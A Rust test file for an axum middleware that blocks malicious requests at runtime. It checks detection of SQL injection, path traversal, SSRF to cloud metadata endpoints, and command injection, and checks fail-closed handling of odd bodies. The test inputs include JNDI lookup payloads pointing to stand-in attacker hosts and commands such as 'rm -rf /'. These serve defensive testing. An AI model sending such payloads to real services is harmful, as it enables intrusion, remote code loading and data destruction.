#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::*;
use axum::{
    Router,
    body::Bytes,
    http::HeaderValue,
    routing::{get, post},
};
use tower::ServiceExt;

async fn protected_resource() -> impl IntoResponse {
    (StatusCode::OK, "Protected Resource")
}

async fn echo(body: Bytes) -> Bytes {
    body
}

fn guarded_app() -> Router {
    Router::new()
        .route("/items", get(protected_resource))
        .route("/echo", post(echo))
        .layer(RaspSecurityLayer)
}

#[test]
fn test_rasp_sqli_detection() {
    assert!(RaspInspector::inspect_uri(
        "/api/users?q=UNION SELECT * FROM passwords"
    ));
    assert!(RaspInspector::inspect_uri("/login?user=admin' OR '1'='1"));
    assert!(RaspInspector::inspect_text(
        "SELECT * FROM users WHERE id = 1; SLEEP(5);"
    ));
    assert!(!RaspInspector::inspect_uri("/api/users?id=123"));
}

#[test]
fn ascii_fold_matches_the_standard_library_for_every_byte() {
    for byte in u8::MIN..=u8::MAX {
        assert_eq!(fold_ascii_byte(byte), byte.to_ascii_lowercase());
    }
}

#[test]
fn test_rasp_path_traversal_detection() {
    assert!(RaspInspector::inspect_uri(
        "/download?file=../../etc/passwd"
    ));
    assert!(!RaspInspector::inspect_uri("/download?file=document.pdf"));
}

#[test]
fn test_rasp_jndi_detection() {
    assert!(RaspInspector::inspect_text(
        "${jndi:ldap://attacker.com/exploit}"
    ));
    assert!(RaspInspector::inspect_text("${rmi://evil.com:1099/obj}"));
}

#[test]
fn test_rasp_header_inspection() {
    let mut headers = HeaderMap::new();
    headers.insert(
        "user-agent",
        HeaderValue::from_static("${jndi:ldap://evil.com/a}"),
    );
    assert!(RaspInspector::inspect_headers(&headers));

    let mut clean_headers = HeaderMap::new();
    clean_headers.insert("user-agent", HeaderValue::from_static("Mozilla/5.0"));
    assert!(!RaspInspector::inspect_headers(&clean_headers));
}

#[test]
fn test_rasp_ssrf_and_rce_detection() {
    assert!(RaspInspector::inspect_uri(
        "/proxy?url=http://169.254.169.254/latest/meta-data"
    ));
    assert!(RaspInspector::inspect_uri(
        "/fetch?url=http://metadata.google.internal/computeMetadata"
    ));
    assert!(RaspInspector::inspect_text("input; rm -rf /"));
    assert!(RaspInspector::inspect_text("echo test | sh"));
    assert!(RaspInspector::inspect_text(
        "powershell -Command Invoke-WebRequest"
    ));
    assert!(RaspInspector::inspect_text("run /bin/bash script.sh"));
}

#[test]
fn json_body_inspection_decodes_escaped_strings() {
    assert!(RaspInspector::inspect_body(
        r#"{"path":"\u002e\u002e/etc/passwd"}"#,
        "application/json"
    ));
    assert!(!RaspInspector::inspect_body(
        r#"{"message":"ordinary profile update"}"#,
        "application/json"
    ));
}

#[test]
fn textual_and_structured_media_types_are_selected_exactly() {
    for media_type in [
        "text/plain; charset=utf-8",
        "application/json",
        "application/xml",
        "application/problem+json",
        "application/problem+xml",
        "application/x-www-form-urlencoded",
    ] {
        let mut headers = HeaderMap::new();
        headers.insert(header::CONTENT_TYPE, HeaderValue::from_static(media_type));
        assert!(should_inspect_body(&headers), "should inspect {media_type}");
    }

    let mut binary = HeaderMap::new();
    binary.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/octet-stream"),
    );
    assert!(!should_inspect_body(&binary));
}

#[tokio::test]
async fn middleware_blocks_attacks_and_preserves_clean_bodies() {
    let app = guarded_app();
    let attack_req = Request::builder()
        .uri("/items?q=UNION%20SELECT%20password%20FROM%20users")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.clone().oneshot(attack_req).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );

    let clean_req = Request::builder()
        .uri("/items?page=1")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.clone().oneshot(clean_req).await.unwrap().status(),
        StatusCode::OK
    );

    let attack_body = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"path":"\u002e\u002e/etc/passwd"}"#))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(attack_body).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );

    let clean_payload = br#"{"message":"hello"}"#.to_vec();
    let clean_body = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(clean_payload.clone()))
        .unwrap();
    let response = app.oneshot(clean_body).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let echoed = axum::body::to_bytes(response.into_body(), 1_024)
        .await
        .unwrap();
    assert_eq!(echoed.as_ref(), clean_payload);
}

#[tokio::test]
async fn middleware_fails_closed_for_uninspectable_textual_bodies() {
    let app = guarded_app();

    let encoded = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .header(header::CONTENT_ENCODING, "gzip")
        .body(Body::from("compressed"))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(encoded).await.unwrap().status(),
        StatusCode::UNSUPPORTED_MEDIA_TYPE
    );

    let invalid_utf8 = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .body(Body::from(vec![0xff]))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(invalid_utf8).await.unwrap().status(),
        StatusCode::BAD_REQUEST
    );

    let declared_oversized = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .header(
            header::CONTENT_LENGTH,
            (MAX_INSPECTED_REQUEST_BYTES + 1).to_string(),
        )
        .body(Body::from(vec![b'a'; MAX_INSPECTED_REQUEST_BYTES + 1]))
        .unwrap();
    assert_eq!(
        app.clone()
            .oneshot(declared_oversized)
            .await
            .unwrap()
            .status(),
        StatusCode::PAYLOAD_TOO_LARGE
    );

    let undeclared_oversized = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .body(Body::from(vec![b'a'; MAX_INSPECTED_REQUEST_BYTES + 1]))
        .unwrap();
    assert_eq!(
        app.oneshot(undeclared_oversized).await.unwrap().status(),
        StatusCode::PAYLOAD_TOO_LARGE
    );
}
